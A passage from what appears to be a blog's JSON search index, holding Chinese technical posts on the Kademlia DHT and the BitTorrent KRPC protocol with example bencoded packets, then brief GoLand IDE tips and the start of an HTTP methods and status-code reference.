color=red>其实，节点ID与文件散列直接对应，它所表示的那个节点存储着哪儿能够获取文件和资源的相关信息</font>\n6. 当我们在网络中搜索某些值(即通常搜索存储文件散列或关键词的节点)的时候，Kademlia算法需要知道与这些值相关的键，然后分步在网络中开始搜索。每一步都会找到一些节点，这些节点的ID与键更为接近，如果有节点直接返回搜索的值或者再也无法找到与键更为接近的节点ID的时候搜索便会停止。这种搜索值的方法是非常高效的\n7. 与其他的分散式杂凑表的实现类似，在一个包含n个节点的系统的值的搜索中，Kademlia仅访问O(log(n))个节点。非集中式网络结构还有更大的优势，那就是它能够显著增强抵御拒绝服务攻击的能力。即使网络中的一整批节点遭受泛洪攻击，也不会对网络的可用性造成很大的影响，通过绕过这些漏洞(被攻击的节点)来重新编织一张网络，网络的可用性就可以得到恢复 \n```\n\n### 0x2: p2p网络架构演进\n\n```\n1. 第一代P2P文件分享网络，像Napster，依赖于中央数据库来协调网络中的查询\n2. 第二代P2P网络，像Gnutella，使用泛滥式查询(query flooding)来查询文件，它会搜索网络中的所有节点\n3. 第三代p2p网络使用分散式杂凑表来查询网络中的文件，分散式杂凑表在整个网络中储存资源的位置\n```\n\n这些协议追求的主要目标就是快速定位期望的节点。Kademlia基于两个节点之间的距离计算，该距离是\"两个网络节点ID号的异或\"，计算的结果最终作为整型数值返回。关键字和节点ID有同样的格式和长度，因此，可以使用同样的方法计算关键字和节点ID之间的距离。节点ID一般是一个大的随机数，选择该数的时候所追求的一个目标就是它的唯一性(希望在整个网络中该节点ID是唯一的)。异或距离跟实际上的地理位置没有任何关系，只与ID相关。因此很可能来自德国和澳大利亚的节点由于选择了相似的随机ID而成为邻居。选择异或是因为通过它计算的距离享有几何距离公式的一些特征，尤其体现在以下几点\n\n```\n1. 节点和它本身之间的异或距离是0\n2. 异或距离是对称的：即从A到B的异或距离与从B到A的异或距离是等同的\n3. 异或距离符合三角不等式: 三个顶点A B C，AC异或距离小于或等于AB异或距离和BC异或距离之和，这种几何数学特征，可以很好的支撑算法进行寻路路由\n```\n\n由于以上的这些属性，在实际的节点距离的度量过程中计算量将大大降低。Kademlia搜索的每一次迭代将距目标至少更近1 bit(每次根据XOR结果，往前选择1bit更近的节点)。一个基本的具有2的n次方个节点的Kademlia网络在最坏的情况下只需花n步就可找到被搜索的节点或值\n\n\n>因为Kademlia是根据bit位XOR计算得到\"相对距离\"的，对于越低bit位，XOR可能得到的结果越小，对于越高位的bit位，XOR可能得到的值就越大，并且是呈现2的指数方式增长的，所以，从数学上来说，一个DHT网络中的所有节点，通过这种方式(XOR距离)进行寻址，每次前进一个bit，最大只需要log2N次即可到达目标节点(log2逼近的思路，即bit 2可以表示世界上任何数字)\n\n### 0x3: 路由表(就是K桶,存放端口)\n\nKademlia路由表由多个列表组成，<font color=red>每个列表对应节点ID的一位(例如: 假如节点ID共有6位，则节点的路由表将包含6个列表)，</font><font color=green>一个列表中包含多个条目，条目中包含定位其他节点所必要的一些数据。列表条目中的这些数据通常是由其他节点的IP地址，端口和节点ID组成。</font>这里仔细思考一下\n\n\n1. 节点ID的一位就是1bit，假设我们的节点ID是: 111000\n2. 对第一个K桶来说，它的列表中的条目必须第一bit不能是1，因为第一个K桶的含义是和该节点的距离是最远的一个分组，第一位不为1，它背后的含义是该分组里的节点和该节点的距离至少在2^6以上，它代表了整个网络中和该节点逻辑距离最远的一些节点 它的列表条目是这样的: 0 00000 ~ 0 111111\n3. 对第二个K桶来说，它的列表中的条目的第一位必须是1，表示和当前节点的第一bit相同，第二bit不能是1，这样代表的意思是第二个K桶里的节点和该节点的距离是介于MAX(2bit)和MIN(1bit)之间的距离，它的列表条目是这样的: 10 0000 ~ 10 1111\n4. 第三个K桶的情况和前2个相同  \n5. 对第四个K桶的来说，它的列表中的条目前三位都是1，第四位不是0，它的列表条目是这样的: 1111 00 ~ 1111 11\n6. 后面的bit位情况类推，可以看出，<font color=red>越低bit位的K桶的MAX(XOR)就越小，它的可变范围就越小了。这代表了越低bit位的K桶里存储的都是距离当前节点越近的Nod节点</font>\n\n\n而条目列表以节点ID的一位(即1bit)来分组是有道理的：我们使用log2N的指数分级方法把除当前节点的全网所有节点都进行了分组，当别的节点来向当前节点请求某个资源HASH的时候，将待搜索寻址的\"目标节点ID\"和路由表进行异或，会有2种情况\n\n1. 找到某个条目和目标节点XOR为0，即已经寻址成功，则直接返回这个条目给requester即可\n2. <font color=red>如果没找到XOR结果为0的条目，则选取那个XOR值最小的条目对应的K桶中的K个条目返回给requester，因为这些条目是最有可能存储了目标节点ID条目的</font>\n\n\n每个列表对应于与节点相距\"特定范围距离\"的一些节点，节点的第n个列表中所找到的节点的第n位与该节点的第n位肯定不同，而前n-1位相同\n\n```\n1. 这就意味着很容易使用网络中远离该节点的一半节点来填充第一个列表(第一位不同的节点最多有一半)\n2. 而用网络中四分之一的节点来填充第二个列表(比第一个列表中的那些节点离该节点更近一位)\n3. 依次类推。如果ID有128个二进制位，则网络中的每个节点按照不同的异或距离把其他所有的节点分成了128类，ID的每一位对应于其中的一类\n```\n\n随着网络中的节点被某节点发现，它们被逐步加入到该节点的相应的列表中，这个过程中包括\n\n1. <font color=red>向节点列表中存信息: 录入别的节点发布的声明</font>\n2. 从节点列表中取信息的操作\n3. 甚至还包括当时协助其他节点寻找相应键对应值的操作: 转发其他节点的寻址请求\n\n\n这个过程中发现的所有节点都将被加入到节点的列表之中，因此节点对整个网络的感知是动态的，这使得网络一直保持着频繁地更新，增强了抵御错误和攻击的能力\n\n---\n\n在Kademlia相关的论文中，列表也称为K桶，其中K是一个系统变量，如20，每一个K桶是一个最多包含K个条目的列表，也就是说，网络中所有节点的一个列表(对应于某一位，与该节点相距一个特定的距离)最多包含20个节点。随着对应的bit位变低(即对应的异或距离越来越短)(bit位越小，可能的距离MAX值就越小了，即距离目标节点的距离越近)，K桶包含的可能节点数迅速下降(K定义的是该bit对应的列表最多能存储K个条目，但不一定都是K存满，当到最低几个bit位的时候，K桶里可能就只有几个个位数的条目了)。由于网络中节点的实际数量远远小于可能ID号的数量，所以对应那些短距离的某些K桶可能一直是空的(如果异或距离只有1，可能的数量就最大只能为1，这个异或距离为1的节点如果没有发现，则对应于异或距离为1的K桶则是空的)\n\n\n![1](Kademlia_DHT_KRPC_BitTorrent协议1/1.png)\n\n从这个逻辑图中可以看出\n\n```\n1. 节点的HASH值决定了它们的逻辑距离，即Kademlia网络中的下一跳寻址是根据HASH XOR的值范围(数值大小范围)结果决定的\n2. 该网络最大可有2^3，即8个关键字和节点，目前共有7个节点加入，每个节点用一个小圈表示(在树的底部)\n3. 考虑那个用黑圈标注的节点6，它共有3个K桶(即3bit位)\n\n节点0，1和2(二进制表示为000，001和010)是第一个K桶的候选节点\n000 -> 110: 6\n001 -> 110: 5\n010 -> 110: 4\n\n节点3目前(二进制表示为011)还没有加入网络\n\n节点4和节点5(二进制表示分别为100和101)是第二个K桶的候选节点\n100 -> 110: 2\n101 -> 110: 1 \n\n节点7(二进制表示为111)是第3个K桶的候选节点\n111 -> 110: 1\n```\n\n图中3个K桶都用灰色圈表示，假如K桶的大小(即K值)是2，那么第一个K桶只能包含3个节点中的2个。众所周知，那些长时间在线连接的节点未来长时间在线的可能性更大，基于这种静态统计分布的规律，Kademlia选择把那些长时间在线的节点存入K桶，这一方法增长了未来某一时刻有效节点的数量(hot hint)，同时也提供了更为稳定的网络。当某个K桶已满，而又发现了相应于该桶的新节点的时候，那么，就首先检查K桶中最早访问的节点，假如该节点仍然存活，那么新节点就被安排到一个附属列表中(作为一个替代缓存). 只有当K桶中的某个节点停止响应的时候，替代cache才被使用。换句话说，新发现的节点只有在老的节点消失(失效)后才被使用\n\n\n### 0x4: 协议消息\n\nKademlia协议共有四种消息\n\n```\n1. PING消息: 用来测试节点是否仍然在线\n2. STORE消息: 在某个节点中存储一个键值对\n3. FIND_NODE消息: 消息请求的接收者将返回自己桶中离请求键值最近的K个节点: 将请求者请求的节点HASH和自己的HASH进行XOR计算，将计算结果\n4. FIND_VALUE消息: 与FIND_NODE一样，不过当请求的接收者存有请求者所请求的键的时候，它将返回相应键的值\n```\n\n每一个RPC消息中都包含一个发起者加入的随机值，这一点确保响应消息在收到的时候能够与前面发送的请求消息匹配\n\n\n### 0x5: 定位节点\n\n节点查询可以异步进行，也可以同时进行，同时查询的数量由α表示，一般是3\n\n\n1. 在节点查询的时候，它先得到它K桶中离所查询的键值最近的K个节点(XOR值最小的那个条目所在的分组)，然后向这K个节点发起FIND_NODE消息请求(因为这个K桶内的节点最有可能寻址成功)\n2. 消息接收者收到这些请求消息后将在他们的K桶中进行查询，如果他们知道离被查键更近的节点，他们就返回这些节点(最多K个)\n    + 找到某个条目和目标节点XOR为0，即已经寻址成功，则直接返回这个条目给requester即可\n    + 如果没找到XOR结果为0的条目，则选取那个XOR值最小的条目对应的K桶中的K个条目返回给requester，因为这些条目是最有可能存储了目标节点ID条目的\n3. <font color=\"red\">消息的请求者在收到响应后将使用它所收到的响应结果来更新它的结果列表，返回的结果也应该插入到刚才发起请求的那个K桶里，这个结果列表总是保持K个响应FIND_NODE消息请求的最优节点(即离被搜索键更近的K个节点)</font>\n4. 然后消息发起者将向这K个最优节点发起查询，因为刚开始的查询很可能K桶里存的不全是目标节点，而是潜在地离目标节点较近的节点\n5. 不断地迭代执行上述查询过程。因为每一个节点比其他节点对它周边的节点有更好的感知能力(水波扩散式的节点寻址方式)，因此响应结果将是一次一次离被搜索键值越来越近的某节点。如果本次响应结果中的节点没有比前次响应结果中的节点离被搜索键值更近了(即发现这轮查询的结果未发生diff变化了)，这个查询迭代也就终止了\n6. 当这个迭代终止的时候，响应结果集中的K个最优节点就是整个网络中离被搜索键值最近的K个节点(从以上过程看，这显然是局部的，而非整个网络，因为这本质和最优解搜索算法一样，可能陷入局部最优解而无法获得全局最优解) \n7. 节点信息中可以增加一个往返时间，或者叫做RTT的参数，这个参数可以被用来定义一个针对每个被查询节点的超时设置，即当向某个节点发起的查询超时的时候，另一个查询才会发起，当然，针对某个节点的查询在同一时刻从来不超过α个\n\n\n### 0x6: 定位和冗余拷贝资源\n\n通过把资源信息与键进行映射，资源即可进行定位，杂凑表是典型的用来映射的手段。由于以前的STORE消息，存储节点将会有对应STORE所存储的相关资源的信息。定位资源时，如果一个节点存有相应的资源的值的时候，它就返回该资源，搜索便结束了，除了该点以外，定位资源与定位离键最近的节点的过程相似\n\n\n1. 考虑到节点未必都在线的情况，资源的值被存在多个节点上(节点中的K个)，并且，为了提供冗余，还有可能在更多的节点上储存值\n2. 储存值的节点将定期搜索网络中与储存值所对应的键接近的K个节点并且把值复制到这些节点上，这些节点可作为那些下线的节点的补充\n3. 另外，对于那些普遍流行的内容，可能有更多的请求需求，通过让那些访问值的节点把值存储在附近的一些节点上(不在K个最近节点的范围之类)来减少存储值的那些节点的负载，这种新的存储技术就是缓存技术，通过这种技术，依赖于请求的数量，资源的值被存储在离键越来越远的那些节点上(资源热度越高，缓存cache就越广泛)，这使得那些流行的搜索可以更快地找到资源的储存者\n5. 由于返回值的节点的NODE_ID远离值所对应的关键字，网络中的\"热点\"区域存在的可能性也降低了。依据与键的距离，缓存的那些节点在一段时间以后将会删除所存储的缓存值。DHT的某些实现(如Kad)即不提供冗余(复制)节点也不提供缓存，这主要是为了能够快速减少系统中的陈旧信息。在这种网络中，提供文件的那些节点将会周期性地更新网络上的信息(通过NODE_LOOKUP消息和STORE消息)。当存有某个文件的所有节点都下线了，关于该文件的相关的值(源和关键字)的更新也就停止了，该文件的相关信息也就从网络上完全消失了 \n\n\n### 0x7: 加入网络\n\n1. 想要加入网络的节点首先要经历一个引导过程。在引导过程中，节点需要知道其他已加入该网络的某个节点的IP地址和端口号(可从用户或者存储的列表中获得)。假如正在引导的那个节点还未加入网络，它会计算一个目前为止还未分配给其他节点的随机ID号，直到离开网络，该节点会一直使用该ID号 \n2. 正在加入Kademlia网络的节点在它的某个K桶中插入引导节点(加入该网络的介绍人)(负责加入节点的初始化工作)，然后向它的唯一邻居(引导节点)发起NODE_LOOKUP操作请求来定位自己，这种\"自我定位\"将使得Kademlia的其他节点(收到请求的节点)能够使用新加入节点的Node Id填充他们的K桶(邻居互相认识)\n3. 同时也能够使用那些查询过程的中间节点(位于新加入节点和引导节点的查询路径上的其他节点)来填充新加入节点的K桶(相当于完成一个DNS递归查询后，沿途路径上的DNS IP都被记录了)。想象一下这个过程\n    + 新加入的节点可能和\"引导节点\"距离很远，它一上来就向离自己几何距离最远的引导节点问话: \"谁知道我自己这个节点在哪?\"，引导节点会尽力去回答这个问题，即引导节点会把自己K桶内最有可能知道该节点位置(即离该几点XOR几何距离最近的K个点返回给新加入的请求节点)\n    + <font color=\"red\">新加入的请求方收到了K个节点后，把这K个节点保存进自己的K桶，然后继续向这些节点去\"询问(发起find_node请求)\"自己的节点在哪，这些节点会收到这些请求，同时也把新加入节点保存进自己的K桶内</font>\n    + 整个过程和向DNS根域名服务器请求解析某个域名的递归过程类似\n4. 这一自查询过程使得新加入节点自引导节点所在的那个K桶开始，由远及近，对沿途的所有节点逐步得到刷新，整条链路上的邻居都认识了这个新邻居\n5. 最初的时候，节点仅有一个K桶(覆盖所有的ID范围)，当有新节点需要插入该K桶时，如果K桶已满，K桶就开始分裂，分裂发生在节点的K桶的覆盖范围(表现为二叉树某部分从左至右的所有值)包含了该节点本身的ID的时候。对于节点内距离节点最近的那个K桶，Kademlia可以放松限制(即可以到达K时不发生分裂)，因为桶内的所有节点离该节点距离最近，这些节点个数很可能超过K个，而且节点希望知道所有的这些最近的节点。因此，在路由树中，该节点附近很可能出现高度不平衡的二叉子树。假如K是20，新加入网络的节点ID为\"xxx000011001\"，则前缀为\"xxx0011...\"的节点可能有21个，甚至更多，新的节点可能包含多个含有21个以上节点的K桶(位于节点附近的k桶)。这点保证使得该节点能够感知网络中附近区域的所有节点\n\n\n### 0x8: 查询加速\n\n\n1. Kademlia使用异或来定义距离。两个节点ID的异或(或者节点ID和关键字的异或)的结果就是两者之间的距离。对于每一个二进制位来说，如果相同，异或返回0，否则，异或返回1。异或距离满足三角形不等式: 任何一边的距离小于(或等于)其它两边距离之和\n2. 异或距离使得Kademlia的路由表可以建在单个bit之上，即可使用位组(多个位联合)来构建路由表。位组可以用来表示相应的K桶，它有个专业术语叫做前缀，对一个m位的前缀来说，可对应2^m-1个K桶(m位的前缀本来可以对应2^m个K桶)另外的那个K桶可以进一步扩展为包含该节点本身ID的路由树\n3. 一个b位的前缀可以把查询的最大次数从logn减少到logn/b。这只是查询次数的最大值，因为自己K桶可能比前缀有更多的位与目标键相同，这会增加在自己K桶中找到节点的机会，假设前缀有m位，很可能查询一个节点就能匹配2m甚至更多的位组，所以其实平均的查询次数要少的多 \n4. 节点可以在他们的路由表中使用混合前缀，就像eMule中的Kad网络。如果以增加查询的复杂性为代价，Kademlia网络在路由表的具体实现上甚至可以是有异构的\n\n\n### 0x9: 在文件分享网络中的应用\n\nKademlia可在文件分享网络中使用，通过制作Kademlia关键字搜索，我们能够在文件分享网络中找到我们需要的文件以供我们下载。由于没有中央服务器存储文件的索引，这部分工作就被平均地分配到所有的客户端中去\n\n\n\n1. 假如一个节点希望分享某个文件，它先根据文件的内容来处理该文件，通过运算，把文件的内容散列成一组数字，该数字在文件分享网络中可被用来标识文件\n2. <font color=\"red\">这组散列数字必须和节点ID有同样的长度，然后，该节点便在网络中搜索ID值与文件的散列值相近的节点，然后向这些被搜索到的节点广播自己(即把它自己的IP地址存储在那些搜索到的节点上)，本质意思是说: \"你如果要搜索这个文件，就去找那些节点ID就好了，那些节点ID会告诉搜索者应该到自己这里来(文件发布者)来建立TCP连接，下载文件\"，</font><font color=\"blue\">也就是说，它把自己作为文件的源进行了发布(文件共享方式)。正在进行文件搜索的客户端将使用Kademlia协议来寻找网络上ID值与希望寻找的文件的散列值最近的那个节点(寻找文件的过程和寻找节点的机制形成了统一，因为文件和节点的ID的HASH格式是一样的)，然后取得存储在那个节点上的文件源列表</font> \n3. 由于一个键(HASH)可以对应很多值，即同一个文件(通过一个对应的HASH公布到P2P网络中)可以有多个源(因为可能有多个节点都会有这个文件的拷贝)，每一个存储源列表的节点可能有不同的文件的源的信息，这样的话，源列表可以从与键值相近的K个节点获得。 文件的散列值通常可以从其他的一些特别的Internet链接的地方获得，或者被包含在从其他某处获得的索引文件中(即种子文件)\n4. 文件名的搜索可以使用关键词来实现，文件名可以分割成连续的几个关键词，这些关键词都可以散列并且可以和相应的文件名和文件散列储存在网络中。搜索者可以使用其中的某个关键词，联系ID值与关键词散列最近的那个节点，取得包含该关键词的文件列表。由于在文件列表中的文件都有相关的散列值，通过该散列值就可利用上述通常取文件的方法获得要搜索的文件\n\n\n\n# 3. KRPC 协议 KRPC Protocol\n\nKRPC是BitTorrent在Kademlia理论基础之上定义的一个通信消息格式协议，主要用来支持peer节点的获取(get_peer)和peer节点的声明(announce_peer)，以及判活心跳(ping)、节点寻址(find_node)，它在find_node的原理上和DHT是一样的，同时增加了get_peer/announce_peer/ping协议的支持\n\nKRPC协议是由B编码组成的一个简单的RPC结构，有4种请求：ping、find_node、get_peers 和 announce_peer\n\n\n### 0x0: bencode编码\n\nbencode 有 4 种数据类型: string, integer, list 和 dictionary\n\n```\n1. string: 字符是以这种方式编码的: <字符串长度>:<字符串> \n如 hell: 4:hell\n\n2. integer: 整数是一这种方式编码的: i<整数>e \n如 1999: i1999e\n\n3. list: 列表是一这种方式编码的: l[数据1][数据2][数据3][…]e \n如列表 [hello, world, 101]：l5:hello5:worldi101ee\n\n4. dictionary: 字典是一这种方式编码的: d[key1][value1][key2][value2][…]e，其中 key 必须是 string 而且按照字母顺序排序 \n如字典 {aa:100, bb:bb, cc:200}： d2:aai100e2:bb2:bb2:cci200ee\n```\n\nKRPC 协议是由 bencode 编码组成的一个简单的 RPC 结构，他使用 UDP 报文发送。一个独立的请求包被发出去然后一个独立的包被回复。这个协议没有重发(UDP是无连接协议)\n\n\n### 0x1: KRPC字典基本组成元素\n\n一条 KRPC 消息即可能是request，也可能是response，由一个独立的字典组成\n\n```\n1. t关键字: 每条消息都包含 t 关键字，它是一个代表了 transaction ID 的字符串。transaction ID 由请求节点产生，并且回复中要包含回显该字段(挑战-响应模型)，所以回复可能对应一个节点的多个请求。transaction ID 应当被编码为一个短的二进制字符串，比如 2 个字节，这样就可以对应 2^16 个请求\n2. y关键字: 它由一个字节组成，表明这个消息的类型。y 对应的值有三种情况\n    1) q 表示请求(请求Queries): q类型的消息它包含 2 个附加的关键字 q 和 a\n        1.1) 关键字 q: 是字符串类型，包含了请求的方法名字(get_peers/announce_peer/ping/find_node)\n        1.2) 关键字 a: 一个字典类型包含了请求所附加的参数(info_hash/id..)\n    2) r 表示回复(回复 Responses): 包含了返回的值。发送回复消息是在正确解析了请求消息的基础上完成的，包含了一个附加的关键字 r。关键字 r 是字典类型\n        2.1) id: peer节点id号或者下一跳DHT节点\n                2.2) nodes\": \"\" \n                2.3) token: token\n    3) e 表示错误(错误 Errors): 包含一个附加的关键字 e，关键字 e 是列表类型\n        3.1) 第一个元素是数字类型，表明了错误码，当一个请求不能解析或出错时，错误包将被发送。下表描述了可能出现的错误码\n        201: 一般错误\n        202: 服务错误\n        203: 协议错误，比如不规范的包，无效的参数，或者错误的 toke\n        204: 未知方法 \n        3.2) 第二个元素是字符串类型，表明了错误信息\n```\n\n以上是整个KRPC的协议框架结构，具体到请求Query/回复Response/错误Error还有具体的协议实现\n\n\n### 0x2: 请求Query具体协议\n\n所有的请求都包含一个关键字 id，它包含了请求节点的节点 ID。所有的回复也包含关键字id，它包含了回复节点的节点 ID\n\n\n+ <font color=\"red\"> ping: 检测节点是否可达，请求包含一个参数id，代表该节点的nodeID。对应的回复也应该包含回复者的nodeID </font>\n\n```\nping Query = {\"t\":\"aa\", \"y\":\"q\", \"q\":\"ping\", \"a\":{\"id\":\"abcdefghij0123456789\"}}\nbencoded = d1:ad2:id20:abcdefghij0123456789e1:q4:ping1:t2:aa1:y1:qe\n\t\nResponse = {\"t\":\"aa\", \"y\":\"r\", \"r\": {\"id\":\"mnopqrstuvwxyz123456\"}}\nbencoded = d1:rd2:id20:mnopqrstuvwxyz123456e1:t2:aa1:y1:re\n```\n\n+ <font color=\"red\"> find_node: find_node 被用来查找给定 ID 的DHT节点的联系信息，该请求包含两个参数id(代表该节点的nodeID)和target。回复中应该包含被请求节点的路由表中距离target最接近的K个nodeID以及对应的nodeINFO</font>\n```\nfind_node Query = {\"t\":\"aa\", \"y\":\"q\", \"q\":\"find_node\", \"a\": {\"id\":\"abcdefghij0123456789\", \"target\":\"mnopqrstuvwxyz123456\"}}\n# \"id\" containing the node ID of the querying node, and \"target\" containing the ID of the node sought by the queryer. \nbencoded = d1:ad2:id20:abcdefghij01234567896:target20:mnopqrstuvwxyz123456e1:q9:find_node1:t2:aa1:y1:qe\n\t\nResponse = {\"t\":\"aa\", \"y\":\"r\", \"r\": {\"id\":\"0123456789abcdefghij\", \"nodes\": \"def456...\"}}\nbencoded = d1:rd2:id20:0123456789abcdefghij5:nodes9:def456...e1:t2:aa1:y1:re\n```\n\nfind_node 请求包含 2 个参数，第一个参数是 id，包含了请求节点的ID。第二个参数是 target，包含了请求者正在查找的节点的ID\n\t\n当一个节点接收到了 find_node 的请求，他应该给出对应的回复，回复中包含 2 个关键字 id(被请求节点的id) 和 nodes，nodes 是字符串类型，包含了被请求节点的路由表中最接近目标节点的 K(8) 个最接近的节点的联系信息(被请求方每次都统一返回最靠近目标节点的节点列表K捅)\n\t\n```\n参数: {\"id\" : \"<querying nodes id>\", \"target\" : \"<id of target node>\"}\n回复: {\"id\" : \"<queried nodes id>\", \"nodes\" : \"<compact node info>\"}\n```\n\n这里要明确3个概念:\n\t\n1. 请求方的id: 发起这个DHT节点寻址的节点自身的ID，可以类比DNS查询中的客户端\n2. 目标target id: 需要查询的目标ID号，可以类比于DNS查询中的URL，这个ID在整个递归查询中是一直不变的\n3. 被请求节点的id: 在节点的递归查询中，请求方由远及近不断询问整个链路上的节点，沿途的每个节点在返回时都要带上自己的id号\n\n\t\n+ <font color=\"red\"> get_peers: 获取 infohash 的 peers</font>\n\n\n1. get_peers 请求包含 2 个参数(id请求节点ID，info_hash代表torrent文件的infohash，infohash为种子文件的SHA1哈希值，也就是磁力链接的btih值)\n\n2. response get_peer: \n\n\t1) 如果被请求的节点有对应 info_hash 的 peers，他将返回一个关键字 values，这是一个列表类型的字符串。每一个字符串包含了 \"CompactIP-address/portinfo\" 格式的 peers 信息(即对应的机器ip/port信息)(peer的info信息和DHT节点的info信息是一样的)\n\n\t2) 如果被请求的节点没有这个 infohash 的 peers，那么他将返回关键字 nodes(需要注意的是，如果该节点没有对应的infohash信息，而只是返回了nodes，则请求方会认为该节点是一个\"可疑节点\"，则会从自己的路由表K捅中删除该节点)，这个关键字包含了被请求节点的路由表中离 info_hash 最近的 K 个节点(我这里没有该节点，去别的节点试试运气)，使用 \"Compactnodeinfo\" 格式回复。在这两种情况下，关键字 token 都将被返回。token 关键字在今后的 annouce_peer 请求中必须要携带。token 是一个短的二进制字符串\n\n\t\n```\n参数: {\"id\" : \"<querying nodes id>\", \"info_hash\" : \"<20-byte infohash of target torrent>\"}\n\t\n回复: \n{\"id\" : \"<queried nodes id>\", \"token\" :\"<opaque write token>\", \"values\" : [\"<peer 1 info string>\", \"<peer 2 info string>\"]}\n或: \t\n{\"id\" : \"<queried nodes id>\", \"token\" :\"<opaque write token>\", \"nodes\" : \"<compact node info>\"}\n```\n\n+ <font color=\"red\"> announce_peer: 这个请求用来表明发出 announce_peer 请求的节点，正在某个端口下载 torrent 文件</font>\n\nannounce_peer 包含 4 个参数\n\t\n```\n1. 第一个参数是 id: 包含了请求节点的 ID\n2. 第二个参数是 info_hash: 包含了 torrent 文件的 infohash\n3. 第三个参数是 port: 包含了整型的端口号，表明 peer 在哪个端口下载\n4. 第四个参数数是 token: 这是在之前的 get_peers 请求中收到的回复中包含的。收到 announce_peer 请求的节点必须检查这个 token 与之前我们回复给这个节点 get_peers 的 token 是否相同(也就说，所有下载者/发布者都要参与检测新加入的发布者是否伪造了该资源，但是这个机制有一个问题，如果最开始的那个发布者就伪造，则整条链路都是一个伪造的错的资源infohash信息了)\n如果相同，那么被请求的节点将记录发送 announce_peer 节点的 IP 和请求中包含的 port 端口号在 peer 联系信息中对应的 infohash 下，这意味着一个一个事实: 当前这个资源有一个新的peer提供者了，下一次有其他节点希望或者这个资源的时候，会把这个新的(前一次请求下载资源的节点)也当作一个peer返回给请求者，这样，资源的提供者就越来越多，资源共享速度就越来越快\n```\n\n一个peer正在下载某个资源，意味着该peer有能够访问到该资源的渠道，且该peer本地是有这份资源的全部或部分拷贝的，它需要向DHT网络广播announce消息，告诉其他节点这个资源的下载地址\n\t\n```\narguments:  {\"id\" : \"<querying nodes id>\",\n\"implied_port\": <0 or 1>,\n\"info_hash\" : \"<20-byte infohash of target torrent>\",\n\"port\" : <port number>,\n\"token\" : \"<opaque token>\"}\n\t\nresponse: {\"id\" : \"<queried nodes id>\"}\n```\n\n报文包例子 Example Packets \n\t\n```\nannounce_peers Query = {\"t\":\"aa\", \"y\":\"q\", \"q\":\"announce_peer\", \"a\": {\"id\":\"abcdefghij0123456789\", \"implied_port\": 1, \"info_hash\":\"mnopqrstuvwxyz123456\", \"port\": 6881, \"token\": \"aoeusnth\"}}\nbencoded = d1:ad2:id20:abcdefghij01234567899:info_hash20:<br />\nmnopqrstuvwxyz1234564:porti6881e5:token8:aoeusnthe1:q13:announce_peer1:t2:aa1:y1:qe\n\t\nResponse = {\"t\":\"aa\", \"y\":\"r\", \"r\": {\"id\":\"mnopqrstuvwxyz123456\"}}\nbencoded = d1:rd2:id20:mnopqrstuvwxyz123456e1:t2:aa1:y1:re\n```\n\n### 0x3: 回复 Responses\n\n回复 Responses的包已经在上面的Query里说明了\n\n\n### 0x4: 错误 Errors\n\n错误包例子 Example Error Packets\n\n```\ngeneric error = {\"t\":\"aa\", \"y\":\"e\", \"e\":[201, \"A Generic Error Ocurred\"]}\nbencoded = d1:eli201e23:A Generic Error Ocurrede1:t2:aa1:y1:ee\n```\n\n\n","tags":["dht"],"categories":["bittorrent"]},{"title":"golang_ide_goland使用","url":"%2Fp%2F5a4d0049.html","content":"\n\n\n# 1. 自动格式化和导入包\n\n`go fmt + go imports`\n\ngo to preferences ->Tools ->File Watchers and enable go fmt . This way on each save it will format the file.\n\n\ngoland tools->filewatchers->go fmt| go imports\n\n<!-- more -->\n\n# 2. 快捷键\n\n+ 删除行 cmd + x\n\n+ 复制行 cmd + d\n\n+ 进入返回函数 cmd + [] \n\n  \n\n# 3. 小技巧\n\n### 3.1 sturct查看\n\n+ 查看struct实现了哪些接口 `cmd + u`\n\n### 3.2 interface查看\n\n- 查看实现的Struct的列表   ` ctrl + h`\n\n### 3.3 小技巧\n\n+ 呼出最近文件和常用功能 `cmd + E` , favorites 可以查看书签/断点/收藏\n\n+ 文件导航  cmd + 7\n\n  折叠, 展开,设置,隐藏\n\n  按导出排序(建议), 按字母排序(建议),  私有函数(建议),  非当前文件的属性(不建议)\n\n### 3.4 其他\n\n+ 快速搜索文件名字:   两次 shift\n+ 比较文件: 选择两个文件 `cmd+d`, 方便比较json\n\n\n\n# 4. 错误解决\n\n### 4.1  Cannot resolve symbol\n\n鼠标在报错地方, 弹出提示，sync即可解决。\n","tags":["golang"],"categories":["3_golang杂项"]},{"title":"http的原理和技术","url":"%2Fp%2Fb03bc449.html","content":"\n# 1. http 基础\n\n### 1.1 method\n\nHTTP1.0 定义了三种请求方法： GET, POST 和 HEAD方法。\n\nHTTP1.1 新增了六种请求方法：OPTIONS、PUT、PATCH、DELETE、TRACE 和 CONNECT 方法。\n\n<!-- more -->\n\n| 序号 | 方法    | 描述                                                         |\n| :--- | :------ | :----------------------------------------------------------- |\n| 1    | GET     | 请求指定的页面信息，并返回实体主体。                         |\n| 2    | HEAD    | 类似于 GET 请求，只不过返回的响应中没有具体的内容，用于获取报头 |\n| 3    | POST    | 向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST 请求可能会导致新的资源的建立和/或已有资源的修改。 |\n| 4    | PUT     | 从客户端向服务器传送的数据取代指定的文档的内容。             |\n| 5    | DELETE  | 请求服务器删除指定的页面。                                   |\n| 6    | CONNECT | HTTP/1.1 协议中预留给能够将连接改为管道方式的代理服务器。    |\n| 7    | OPTIONS | 允许客户端查看服务器的性能。                                 |\n| 8    | TRACE   | 回显服务器收到的请求，主要用于测试或诊断。                   |\n| 9    | PATCH   | 是对 PUT 方法的补充，用来对已知资源进行局部更新 。           |\n\n### 1.2 状态码\n\n| 状态码 | 状态码英文名称                  | 中文描述                                                     |\n| :----- | :------------------------------ | :----------------------------------------------------------- |\n| 100    | Continue                        | 继续。客户端应继续其请求                                     |\n| 101    | Switching Protocols             | 切换协议。服务器根据客户端的请求切换协议。只能切换到更高级的协议，例如，切换到HTTP的新版本协议 |\n|        |                                 |                                                              |\n| 200    | OK                              | 请求成功。一般用于GET与POST请求                              |\n| 201    | Created                         | 已创建。成功请求并创建了新的资源                             |\n| 202    | Accepted                        | 已接受。已经接受请求，但未处理完成                           |\n| 203    | Non-Authoritative Information   | 非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本 |\n| 204    | No Content                      | 无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档 |\n| 205    | Reset Content                   | 重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域 |\n| 206    | Partial Content                 | 部分内容。服务器成功处理了部分GET请求                        |\n|        |                                 |                                                              |\n| 300    | Multiple Choices                | 